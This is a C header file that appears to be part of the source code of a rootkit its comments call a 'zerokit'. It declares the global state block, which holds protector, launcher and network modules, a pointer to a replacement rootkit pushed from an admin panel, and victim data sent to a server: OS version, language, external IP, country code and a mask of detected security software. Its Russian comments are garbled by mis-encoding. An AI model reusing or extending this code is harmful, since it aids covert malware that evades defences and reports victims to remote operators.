#ifndef __GLOBAL_H_
#define __GLOBAL_H_

typedef uint8_t* (*FngetStaticConfig)();

#define SHUTDOWN_FOR_RELOAD 0x01 // «аверешние работы зерокита с целью передачи управлени€ на новую версию.

typedef struct _global_block
{
    pmod_common_block_t pCommonBlock;
//     pmod_crypto_block_t pCryptoBlock;
//     pmod_dissasm_block_t pDissasmBlock;
    pmod_fs_block_t pFsBlock;
    pmod_protector_block_t pProtectorBlock;
    pmod_tasks_block_t pTasksBlock;
    pmod_launcher_block_t pLauncherBlock;
    pmod_network_block_t pNetworkBlock;
    pmod_tcpip_block_t pTcpipBlock;
    pmod_netcomm_block_t pNetcommBlock;
    pmod_userio_block_t pUserioBlock;
    pmod_logic_block_t pLogicBlock;

    // ƒанный токен определ€ет как именно должно роизойти завершение текущего активного зерокита и запуск нового. ¬озвможные варианты:
    // 1. –елокаци€ зерокита.
    // 2. ѕередача управлени€ новой версии.
    uint32_t shutdownToken;
    uint8_t* pZerokitPack;  // ”казатель на новый зерокит, который был получен как обновление из админки.
    uint32_t packSize;      // –азмер пака зерокита.
    pmod_header_t pModHdr;
    int loadFromMem;

    //uint8_t* pZerokitPack;
    SYSTEM_BASIC_INFORMATION systemInfo;
    ulong_t osMajorVersion;
    ulong_t osMinorVersion;
    uint16_t osSPMajorVersion;
    uint16_t osSPMinorVersion;
    uint8_t osProductType;

    // Ќекоторые параметры системы передаваемые на сервер
    uint16_t osVer;
    uint16_t osLang;
    uint64_t hipsMask;
    uint32_t externalIp;
    uint16_t countryCode;

    char sysPath[16];
    char usrPath[16];
    
    // структура NETWORK_INFO
    void** pNdisMiniports;  // јдрес внутри ndis.sys на список структур NDIS_MINIPORT_BLOCK
    
    char uModifier[4];      // %u

    uint32_t ntpTime;       // ¬рем€ полученное от NTP-сервера, дл€ синхрониза.
    uint32_t lastCheckTime; // Ћоклаьное врем€ последнего успешного запроса на NTP-сервер.
} global_block_t, *pglobal_block_t;

#endif // __GLOBAL_H_
